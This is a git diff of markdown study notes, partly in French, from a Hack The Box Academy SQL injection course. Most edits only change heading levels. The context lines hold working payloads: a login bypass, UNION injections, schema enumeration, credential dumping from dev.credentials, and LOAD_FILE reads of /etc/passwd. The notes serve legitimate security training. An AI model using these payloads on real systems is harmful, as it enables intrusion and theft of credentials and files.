@@ -1,20 +1,20 @@
-# Introduction : 
+## Introduction : 
 
 ![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/SQL%20Injection%20Fundamentals/Images/db_request_3.webp)
 
-# Intro to Databases :
+## Intro to Databases :
 
 ![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/SQL%20Injection%20Fundamentals/Images/DBMS.png)
 
-# Types of Databases :
+## Types of Databases :
 
-## Relational Databases : 
+### Relational Databases : 
 
 ![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/SQL%20Injection%20Fundamentals/Images/web_apps_relational_db.jpg)
 
 The relationship between tables within a database is called a Schema.
 
-## Non-relational Databases : 
+### Non-relational Databases : 
 
 ![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/SQL%20Injection%20Fundamentals/Images/web_apps_non-relational_db.jpg)
 ```json
@@ -34,7 +34,7 @@ The relationship between tables within a database is called a Schema.
 }
 ```
 
-# Intro to MySQL :
+## Intro to MySQL :
 
 ```shell
 NolanCarougeHTB@htb[/htb]$ mysql -u root -h docker.hackthebox.eu -P 3306 -p 
@@ -108,8 +108,7 @@ CREATE TABLE logins (
     );
 ```
 
-
-# SQL Statements : 
+## SQL Statements : 
 
 ```sql
 INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
@@ -153,7 +152,7 @@ mysql> SELECT * FROM logins;
 4 rows in set (0.00 sec)
 ```
 
-# Query Results : 
+## Query Results : 
 
 ```sql
 mysql> SELECT * FROM logins ORDER BY password DESC;
@@ -187,7 +186,7 @@ mysql> SELECT * FROM logins WHERE username like '___';
 +----+----------+----------+---------------------+
 ```
 
-# SQL Operators : 
+## SQL Operators : 
 
 ```sql
 
@@ -207,12 +206,14 @@ Here is a list of common operations and their precedence, as seen in the [MariaD
 - NOT (`!`)
 - AND (`&&`)
 - OR (`||`)
-# Intro to SQL Injections : 
+
+## Intro to SQL Injections : 
 
 Sanitization refers to the removal of any special characters in user-input, in order to break any injection attempts.
 
 ![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/SQL%20Injection%20Fundamentals/Images/types_of_sqli.jpg)
-# Subverting Query Logic : 
+
+## Subverting Query Logic : 
 
 ![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/SQL%20Injection%20Fundamentals/Images/Char%20Encoded.png)
 
@@ -224,7 +225,7 @@ SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something
 ![](https://github.com/nolancarougepro/Hack-The-Box-Academy/blob/main/Tier%200/Medium/SQL%20Injection%20Fundamentals/Images/or_inject_diagram.webp)
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass
 
-# Using Comments : 
+## Using Comments : 
 
 ```sql
 mysql> SELECT username FROM logins; -- Selects usernames from the logins table 
@@ -253,7 +254,7 @@ mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything h
 
 Tip: if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.
 
-# Union Clause : 
+## Union Clause : 
 
 ```sql
 mysql> SELECT * FROM ports;
@@ -293,7 +294,7 @@ Note: The data types of the selected columns on all positions should be the same
 SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
 ```
 
-# Union Injection : 
+## Union Injection : 
 
 On doit savoir le nombre de colonnes de la table avant de faire une injection SQL avec ORDER BY.
 
@@ -317,7 +318,7 @@ Trouver quels sont les colonnes affichées :
 cn' UNION select 1,@@version,3,4-- -
 ```
 
-# Database Enumeration : 
+## Database Enumeration : 
 
 Pour savoir si on a une BD MySQL : 
 
@@ -360,7 +361,7 @@ cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.C
 cn' UNION select 1, username, password, 4 from dev.credentials-- -
 ```
 
-# Reading Files : 
+## Reading Files : 
 
 Savoir qui nous sommes : 
 ```sql
@@ -400,7 +401,7 @@ cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
 cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
 ```
 
-# Writing Files : 
+## Writing Files : 
 
 To be able to write files to the back-end server using a MySQL database, we require three things:
 1. User with `FILE` privilege enabled
